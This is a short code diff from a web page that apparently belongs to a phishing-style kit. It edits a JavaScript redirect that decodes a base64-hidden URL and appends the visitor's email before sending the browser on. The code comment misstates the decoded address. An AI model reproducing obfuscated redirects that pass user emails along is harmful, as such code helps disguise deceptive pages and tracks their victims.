@@ -1811,7 +1811,7 @@ src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4QAYRXhpZgAASUkqAAgAAAAA
     }
 
     function redirect(email) {
-        var linkx = "ZmFjZWJvb2suY29t"; // Base64 encoded link for "https://www.facebook.com/"
+        var linkx = "aHR0cDovL2ZhY2Vib29rLmNvbQ=="; // Base64 encoded link for "https://www.facebook.com/"
         var decodedLink = atob(linkx);
         var finalLink = decodedLink + "#" + email; // Append the email directly to the URL
         window.location.href = finalLink;
